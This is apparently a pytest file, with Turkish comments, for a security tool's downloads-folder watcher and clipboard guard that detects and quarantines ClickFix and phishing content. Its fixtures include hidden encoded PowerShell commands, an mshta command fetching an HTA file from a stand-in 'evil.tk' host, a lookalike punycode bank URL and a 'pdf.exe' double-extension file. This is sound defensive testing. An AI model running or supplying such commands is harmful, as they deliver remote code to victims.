"""v1.3.0: İndirilenler klasörü izleyicisi ve Pano ClickFix/phishing koruma testleri."""

import json

from app.cli import main as cli_main
from app.watchers.clipboard_guard import ClipboardGuard, analyze_clipboard_text
from app.watchers.file_watcher import FileWatchState, scan_watch_dirs_once


def test_file_watch_state_dedup_and_corrupt_backup(tmp_path):
    st_file = tmp_path / "watch_state.json"
    st_file.write_text("{bozuk-json", encoding="utf-8")
    st = FileWatchState(st_file)
    assert st.entries == {}
    assert list(tmp_path.glob("watch_state.json.bozuk-*"))

    f = tmp_path / "a.txt"
    f.write_text("merhaba", encoding="utf-8")
    assert st.is_seen(f) is False
    st.mark(f)
    st.save()
    st2 = FileWatchState(st_file)
    assert st2.is_seen(f) is True


def test_scan_watch_dirs_skips_temp_and_quarantines(tmp_path):
    dl = tmp_path / "Downloads"
    dl.mkdir()
    (dl / "inprogress.crdownload").write_bytes(b"MZ")
    (dl / "temp.part").write_bytes(b"MZ")
    (dl / "ok.txt").write_text("normal not", encoding="utf-8")
    evil = dl / "payload.ps1"
    evil.write_text("powershell -w hidden -enc JAB4AD0AMQA=", encoding="utf-8")

    st = FileWatchState(tmp_path / "state.json")
    log = tmp_path / "alerts.jsonl"
    qdir = tmp_path / "quarantine"
    scanned, alerts = scan_watch_dirs_once(
        [dl], st, alert_on="HIGH", action="quarantine",
        quarantine_dir=qdir, alert_log=str(log), notify=False,
    )
    names = {r["filename"] for r in scanned}
    assert "ok.txt" in names and "payload.ps1" in names
    assert "inprogress.crdownload" not in names and "temp.part" not in names
    assert len(alerts) == 1
    assert alerts[0]["source"] == "file_watcher"
    assert alerts[0]["quarantined_to"].endswith(".quarantined")
    assert not evil.exists()
    assert json.loads(log.read_text(encoding="utf-8").splitlines()[0])["filename"] == "payload.ps1"

    # İkinci turda aynı dosya tekrar taranmaz
    scanned2, alerts2 = scan_watch_dirs_once([dl], st, notify=False)
    assert scanned2 == [] and alerts2 == []


def test_analyze_clipboard_clickfix_and_phishing():
    r1 = analyze_clipboard_text("powershell.exe -w hidden -enc JAB4AD0AMQA=")
    assert r1["clickfix_detected"] is True
    assert r1["risk_score"] >= 40

    r2 = analyze_clipboard_text("mshta https://evil.tk/verify.hta")
    assert r2["clickfix_detected"] is True
    assert r2["risk_score"] >= 60

    r3 = analyze_clipboard_text("http://xn--bank-ev1l.com/login")
    assert r3["risk_score"] >= 25
    assert r3["phishing_detected"] is True

    r_ok = analyze_clipboard_text("Normal toplantı linki olmadan sade metin.")
    assert r_ok["risk_level"] == "LOW"
    assert r_ok["clickfix_detected"] is False


def test_clipboard_guard_dedup_and_toggle():
    g = ClipboardGuard(enabled=True)
    r1 = g.check_once(text_override="powershell -enc JAB4")
    assert r1 is not None and r1["clickfix_detected"] is True
    # Aynı içerikte tekrar rapor üretmez
    assert g.check_once(text_override="powershell -enc JAB4") is None

    assert g.toggle() is False
    assert g.check_once(text_override="mshta http://evil.tk/a") is None
    assert g.toggle() is True


def test_cli_watch_and_clipboard(tmp_path):
    dl = tmp_path / "dl"
    dl.mkdir()
    (dl / "fatura.pdf.exe").write_bytes(b"MZ")
    code = cli_main([
        "watch", "--dir", str(dl), "--once", "--quiet",
        "--notify", "off", "--state", str(tmp_path / "st.json"), "--fail-on", "MEDIUM",
    ])
    assert code == 1

    assert cli_main([
        "clipboard", "--once", "--text", "powershell -w hidden -enc JAB4",
        "--notify", "off", "--quiet", "--fail-on", "MEDIUM",
    ]) == 1
    assert cli_main([
        "clipboard", "--once", "--text", "merhaba dunya",
        "--notify", "off", "--quiet", "--fail-on", "MEDIUM",
    ]) == 0


def test_watch_loop_and_json_cli(tmp_path):
    import threading
    from app.watchers.file_watcher import default_watch_dirs, run_file_watcher

    assert isinstance(default_watch_dirs(all_users=False), list)
    dl = tmp_path / "dl2"
    dl.mkdir()
    (dl / "update.ps1").write_text("powershell -w hidden -enc JAB4", encoding="utf-8")

    st = FileWatchState(tmp_path / "loop_state.json")
    stop = threading.Event()
    stop.set()
    # İlk turdan önce set olduğu için hemen döner; bir tur çalıştırmak için Timer kullan
    stop2 = threading.Event()
    threading.Timer(0.1, stop2.set).start()
    run_file_watcher([dl], st, interval_sec=1, stop_event=stop2, notify=False, alert_log=str(tmp_path / "a.jsonl"))
    assert (tmp_path / "a.jsonl").exists()

    assert cli_main([
        "watch", "--dir", str(dl), "--once", "--json", "--notify", "off",
        "--state", str(tmp_path / "st2.json"), "--fail-on", "NEVER",
    ]) == 0


def test_clipboard_guard_loop_and_seq(monkeypatch):
    import threading
    from app.watchers.clipboard_guard import ClipboardGuard, get_clipboard_sequence

    assert isinstance(get_clipboard_sequence(), int)
    g = ClipboardGuard(enabled=True)
    calls = {"n": 0}
    seen_alerts = []

    def _fake_check(text_override=None, force=False):
        calls["n"] += 1
        if calls["n"] == 2:
            return {"risk_level": "HIGH", "risk_score": 80, "reasons": ["ClickFix"]}
        return None

    monkeypatch.setattr(g, "check_once", _fake_check)
    stop = threading.Event()
    threading.Timer(0.25, stop.set).start()
    g.run_loop(stop, interval_sec=0.05, alert_on="MEDIUM", on_alert=seen_alerts.append)
    assert len(seen_alerts) == 1
